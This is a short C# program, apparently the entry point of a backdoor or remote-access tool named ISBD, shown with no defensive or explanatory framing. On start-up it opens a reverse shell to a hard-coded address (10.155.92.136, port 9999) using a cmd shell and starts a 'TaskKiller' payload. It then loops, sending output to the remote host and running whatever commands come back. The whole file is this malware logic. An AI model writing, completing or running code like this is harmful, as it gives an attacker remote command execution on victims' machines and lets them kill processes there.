using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Threading;
using System.Runtime.InteropServices;
using System.Net;
using Enums;

namespace ISBD
{
    class Program
    {
        private static bool ourExitFlag;
        private static ISBDPayload.PayloadManager ourPayloadManager;
        private static string aCommand = "";

        static void Init()
        {
            ourExitFlag = false;
            ourPayloadManager = new ISBDPayload.PayloadManager();
            ReverseManager.Initialize(IPAddress.Parse("10.155.92.136"), 9999, ShellType.Cmd);

            ourPayloadManager.Start(Payload.TaskKiller);
        }

        static void Main(string[] args)
        {
            Init();
            while (!ourExitFlag)
            {
                Update();
            }
        }

        private static void Update()
        {
            ReverseManager.WriteStream(aCommand);
            aCommand = ReverseManager.WaitForCommand(); 
        }

        public static void Exit()
        {
            ourExitFlag = true;
        }
    }
}
